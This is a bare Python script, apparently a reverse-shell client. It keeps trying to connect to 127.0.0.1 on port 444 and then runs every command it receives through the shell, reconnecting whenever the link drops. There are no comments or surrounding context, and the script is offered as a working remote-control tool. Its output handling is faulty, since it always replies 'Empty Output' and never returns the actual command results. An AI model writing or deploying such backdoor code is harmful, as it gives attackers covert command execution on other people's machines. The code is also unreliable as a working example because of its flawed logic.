import socket
import subprocess
import sys
from threading import *
from queue import Queue, Empty

def enqueue_output(out, queue):
        for line in iter(out.readline, b''):
            queue.put(line)
        out.close()
def connect():
    ON_POSIX = 'posix' in sys.builtin_module_names
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 444))
            break
        except socket.error:
            pass
    while 1:
        try:
            recv = s.recv(102400).decode("utf-8")
            process = subprocess.Popen(recv, shell=True,stdout=subprocess.PIPE, bufsize=1, close_fds=ON_POSIX)
            q = Queue()
            thread = Thread(target=enqueue_output, args=(process.stdout, q))
            thread.daemon = True
            thread.start()
            try: line = q.get_nowait(); s.send(bytearray("Empty Output","utf-8"))
            except Empty: s.send(bytearray("Empty Output","utf-8"))
            else: pass
        except socket.error:
            s.close()
            connect()
connect()
